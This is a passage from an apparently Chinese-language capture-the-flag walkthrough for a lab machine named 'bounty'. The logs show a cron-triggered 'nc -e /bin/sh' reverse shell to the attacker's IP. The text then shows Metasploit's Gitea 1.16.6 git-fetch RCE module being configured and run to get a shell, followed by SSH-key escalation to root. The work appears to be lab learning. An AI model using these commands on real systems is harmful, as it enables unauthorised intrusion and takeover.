<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1413</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1399</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1371</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1347</span>   <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">110</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">11</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">109</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">108</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">107</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">106</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">105</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">100</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">10</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1</span>      <span class="token operator">|</span> /sbin/init 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:44:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1557</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:44:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1559</span>   <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:44:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1560</span>   <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /usr/bin/php /var/www/html/document.html 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:44:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1561</span>   <span class="token operator">|</span> /usr/bin/php /var/www/html/document.html 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:44:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1562</span>   <span class="token operator">|</span> <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.1.105 <span class="token number">4567</span> </code></pre>
<h2 id="gitea-rce"><a href="#gitea-rce" class="headerlink" title="gitea-rce"></a>gitea-rce</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hania@bounty:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">4</span> root      root      <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root      root      <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">3</span> hania     hania     <span class="token number">4096</span> ago <span class="token number">19</span> <span class="token number">17</span>:43 hania
drwxr-xr-x  <span class="token number">7</span> primavera primavera <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> primavera</code></pre>
<p>home下有两个用户，大概率需要提权到<code>primavera</code>，sudo一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hania@bounty:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> hania on bounty:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User hania may run the following commands on bounty:
    <span class="token punctuation">(</span>primavera<span class="token punctuation">)</span> NOPASSWD: /home/primavera/gitea <span class="token punctuation">\</span>"<span class="token punctuation">\</span>"</code></pre>
<p>执行一下发现在3000端口开启了一个gitea</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hania@bounty:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> primavera /home/primavera/gitea <span class="token punctuation">\</span>"<span class="token punctuation">\</span>"
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 cmd/web.go:102:runWeb<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Starting Gitea on PID: <span class="token number">1600</span>
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 cmd/web.go:150:runWeb<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Global init
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:107:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Git Version: <span class="token number">2.30</span>.2, Wire Protocol Version <span class="token number">2</span> Enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:110:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> AppPath: /home/primavera/gitea
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:111:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> AppWorkPath: /home/primavera
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:112:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Custom path: /home/primavera/custom
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:113:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Log path: /home/primavera/log
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:114:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Configuration file: /home/primavera/custom/conf/app.ini
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:115:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Run Mode: Prod
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.dules/setting/log.go:287:newLogService<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Gitea v1.16.6 built with GNU Make <span class="token number">4.1</span>, go1.18.1 <span class="token builtin class-name">:</span> bindata, sqlite, sqlite_unlock_notify
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.dules/setting/log.go:334:newLogService<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Gitea Log Mode: Console<span class="token punctuation">(</span>Console:<span class="token punctuation">)</span>
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.dules/setting/log.go:250:generateNamedLogger<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Router Log: Console<span class="token punctuation">(</span>console:<span class="token punctuation">)</span>
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/setting/cache.go:78:newCacheService<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Cache Service Enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/setting/cache.go:93:newCacheService<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Last Commit Cache Service Enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/setting/session.go:75:newSessionService<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Session Service Enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/storage/storage.go:171:initAttachments<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Initialising Attachment storage with type: 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/storage/local.go:46:NewLocalStorage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Creating new Local Storage at /home/primavera/data/attachments
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/storage/storage.go:165:initAvatars<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Initialising Avatar storage with type: 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/storage/local.go:46:NewLocalStorage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Creating new Local Storage at /home/primavera/data/avatars
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/storage/storage.go:183:initRepoAvatars<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Initialising Repository Avatar storage with type: 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/storage/local.go:46:NewLocalStorage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Creating new Local Storage at /home/primavera/data/repo-avatars
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/storage/storage.go:177:initLFS<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Initialising LFS storage with type: 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/storage/local.go:46:NewLocalStorage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Creating new Local Storage at /home/primavera/data/lfs
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.s/storage/storage.go:189:initRepoArchives<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Initialising Repository Archive storage with type: 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 <span class="token punctuation">..</span>.les/storage/local.go:46:NewLocalStorage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Creating new Local Storage at /home/primavera/data/repo-archive
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/init.go:131:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> SQLite3 support is enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/common/db.go:20:InitDBEngine<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Beginning ORM engine initialization.
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 routers/common/db.go:27:InitDBEngine<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> ORM engine initialization attempt <span class="token comment">#1/10...</span>
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:32 cmd/web.go:153:runWeb<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> PING DATABASE mysql
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 cmd/web.go:153:runWeb<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>W<span class="token punctuation">]</span> Table project <span class="token function">column</span> board_type db <span class="token builtin class-name">type</span> is INT<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> UNSIGNED, struct <span class="token builtin class-name">type</span> is INT UNSIGNED
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 cmd/web.go:153:runWeb<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>W<span class="token punctuation">]</span> Table project <span class="token function">column</span> <span class="token builtin class-name">type</span> db <span class="token builtin class-name">type</span> is INT<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> UNSIGNED, struct <span class="token builtin class-name">type</span> is INT UNSIGNED
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 routers/init.go:137:GlobalInitInstalled<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> ORM engine initialization successful<span class="token operator">!</span>
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 <span class="token punctuation">..</span>.er/issues/indexer.go:144:func2<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> PID <span class="token number">1600</span>: Initializing Issue Indexer: bleve
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 <span class="token punctuation">..</span>.xer/stats/indexer.go:39:populateRepoIndexer<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Populating the repo stats indexer with existing repositories
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 <span class="token punctuation">..</span>.er/issues/indexer.go:223:func3<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Issue Indexer Initialization took <span class="token number">131</span>.542127ms
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 cmd/web.go:208:listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Listen: http://0.0.0.0:3000
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 cmd/web.go:212:listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> AppURL<span class="token punctuation">(</span>ROOT_URL<span class="token punctuation">)</span>: http://bounty:3000/
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 cmd/web.go:215:listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> LFS server enabled
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:48:33 <span class="token punctuation">..</span>.s/graceful/server.go:61:NewServer<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>I<span class="token punctuation">]</span> Starting new Web server: tcp:0.0.0.0:3000 on PID: <span class="token number">1600</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/19/OtRDua.png" alt="OtRDua.png" loading="lazy"><br>发现啥仓库也没有，于是转向gitea漏洞，发现版本较老<br><img src="https://ooo.0x0.ooo/2024/08/19/OtRLzS.png" alt="OtRLzS.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  searchsploit <span class="token number">1.16</span>.6 gitea                                                                                                                                                                                <span class="token punctuation">[</span><span class="token number">23</span>:54:55<span class="token punctuation">]</span>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Gitea <span class="token number">1.16</span>.6 - Remote Code Execution <span class="token punctuation">(</span>RCE<span class="token punctuation">)</span> <span class="token punctuation">(</span>Metasploit<span class="token punctuation">)</span>                                                                                                                                                     <span class="token operator">|</span> multiple/webapps/51009.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results</code></pre>
<p>发现有个rce，于是打开msf进行漏洞利用尝试</p>
<pre class="language-BASH" data-language="BASH"><code class="language-BASH">msf6 &gt; search 1.16.6 gitea
[-] No results from search
msf6 &gt; search gitea

Matching Modules
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

   #   Name                                    Disclosure Date  Rank       Check  Description
   -   ----                                    ---------------  ----       -----  -----------
   0   exploit&#x2F;multi&#x2F;http&#x2F;gitea_git_fetch_rce  2022-05-16       excellent  Yes    Gitea Git Fetch Remote Code Execution
   1     \_ target: Unix Command               .                .          .      .
   2     \_ target: Linux Dropper              .                .          .      .
   3     \_ target: Windows Command            .                .          .      .
   4     \_ target: Windows Dropper            .                .          .      .
   5   exploit&#x2F;multi&#x2F;http&#x2F;gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   6     \_ target: Unix Command               .                .          .      .
   7     \_ target: Linux Dropper              .                .          .      .
   8     \_ target: Windows Command            .                .          .      .
   9     \_ target: Windows Dropper            .                .          .      .
   10  exploit&#x2F;multi&#x2F;http&#x2F;gogs_git_hooks_rce   2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution
   11    \_ target: Unix Command               .                .          .      .
   12    \_ target: Linux Dropper              .                .          .      .
   13    \_ target: Windows Command            .                .          .      .
   14    \_ target: Windows Dropper            .                .          .      .


Interact with a module by name or index. For example info 14, use 14 or use exploit&#x2F;multi&#x2F;http&#x2F;gogs_git_hooks_rce
After interacting with a module you can manually set a TARGET with set TARGET &#39;Windows Dropper&#39;

msf6 &gt; use 0
[*] Using configured payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
msf6 exploit(multi&#x2F;http&#x2F;gitea_git_fetch_rce) &gt; options

Module options (exploit&#x2F;multi&#x2F;http&#x2F;gitea_git_fetch_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to use
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https:&#x2F;&#x2F;docs.metasploit.com&#x2F;docs&#x2F;using-metasploit&#x2F;basics&#x2F;using-metasploit.html
   RPORT      3000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL&#x2F;TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  &#x2F;                yes       The base path to the gitea application
   URIPATH    &#x2F;                no        The URI to use for this exploit
   USERNAME                    yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port</code></pre>
<p>需要先注册个账号，去注册了一个<code>hacker:hacker</code>账号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> username hacker
username <span class="token operator">=</span><span class="token operator">></span> hacker
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> password hacker
password <span class="token operator">=</span><span class="token operator">></span> hacker
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.105
lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.105
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.1.107
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.107
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.1.105:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. Version detected: <span class="token number">1.16</span>.6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://192.168.1.105:8080/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://192.168.1.105:8080/Rc8kEfiO
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command Stager progress - <span class="token number">100.00</span>% <span class="token keyword">done</span> <span class="token punctuation">(</span><span class="token number">114</span>/114 bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.</code></pre>
<p>看起来可以攻击，但是没拿到会话0.0，修改了好几个payload又修改了target后终于拿到了shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> target Unix Command
target <span class="token operator">=</span><span class="token operator">></span> Unix Command
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.1.105:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. Version detected: <span class="token number">1.16</span>.6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://192.168.1.105:8080/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.
msf6 exploit<span class="token punctuation">(</span>multi/http/gitea_git_fetch_rce<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.1.105:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. Version detected: <span class="token number">1.16</span>.6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://192.168.1.105:8080/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command shell session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.1.105:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.1.107:48044<span class="token punctuation">)</span> at <span class="token number">2024</span>-08-20 00:24:20 +0800

shell
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">find</span> binary <span class="token string">'python'</span> on the target machine
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> python not found
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">find</span> binary <span class="token string">'python3'</span> on the target machine
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found python3 at /usr/bin/python3
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using <span class="token variable"><span class="token variable">`</span>python<span class="token variable">`</span></span> to pop up an interactive shell
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">find</span> binary <span class="token string">'bash'</span> on the target machine
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found <span class="token function">bash</span> at /usr/bin/bash
<span class="token function">bash</span>
<span class="token function">bash</span>
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such <span class="token function">file</span> or directory
primavera@bounty:~/data/gitea-repositories/hacker/iv54uduf.git$ </code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">primavera@bounty:~$ <span class="token function">cat</span> note.txt 
Im the shadow admin. Congrats.</code></pre>
<p>说他是shadow管理员，试了一下，还是没有权限访问shadow文件<br>传了个linpeas分析一下，发现当前用户有ssh私钥，但是我么拿到权限并没有利用ssh，而且authorized_keys是空的，于是尝试连root，成功。<br><img src="https://ooo.0x0.ooo/2024/08/20/OtREPN.png" alt="OtREPN.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">primavera@bounty:~/.ssh$ 
primavera@bounty:~/.ssh$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
